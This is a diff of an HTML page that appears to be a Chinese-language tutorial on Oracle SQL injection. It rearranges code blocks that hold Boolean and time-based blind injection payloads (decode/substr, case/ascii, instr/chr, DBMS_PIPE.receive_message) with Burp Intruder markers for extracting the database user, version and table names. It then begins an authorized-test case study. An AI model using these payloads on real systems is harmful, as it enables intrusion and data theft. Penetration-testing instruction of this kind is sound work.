@@ -201,42 +201,37 @@ select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS(
 <li>
 <p>通过 substr()  decode() 函数的盲注(常用)</p>
 <pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:
-
-and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user
-
-and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version
-
-and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名
-</code></pre>
-</li>
-<li>
-<p>通过 case、substr()、ascii() 函数的盲注</p>
-<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
-
-123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+
-</code></pre>
-</li>
-<li>
-<p>通过 case、instr()、chr() 函数的盲注</p>
-<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数
-
-123=(case instr(user,chr(§*§),§*§,1) when §*§ then '123' else '456' end)--+
-
 </code></pre>
 </li>
 </ul>
+<p>and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user<br>
+and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version<br>
+and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名</p>
+<pre><code>
+- 通过 case、substr()、ascii() 函数的盲注
+
+  
+```sql
+# 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+  123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+
+</code></pre>
+<ul>
+<li>通过 case、instr()、chr() 函数的盲注</li>
+</ul>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数
+123=(case instr(user,chr(§*§),§*§,1) when §*§ then '123' else '456' end)--+
+</code></pre>
 <p>还有其他方式来利用,配合函数,不同环境不同用法</p>
 <h3 id="03-基于时间的盲注">03 .基于时间的盲注</h3>
 <p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
 <ul>
 <li>
 <h3 id="decode-dbms_pipereceive_message-chr-substr利用">Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</h3>
-<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
-
-'||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message('sen',1),2)||' #查user
-</code></pre>
 </li>
 </ul>
+<pre><code class="language-sql">  # 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+'||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message('sen',1),2)||' #查user
+</code></pre>
 <h2 id="0x03-实际案例分析">0x03 实际案例分析</h2>
 <p>某次授权测试,某小程序后端在检查登录时,存在Oracle注入漏洞,注入类型为基于布尔类型的注入</p>
 <h4 id="条件为真时">条件为真时:</h4>
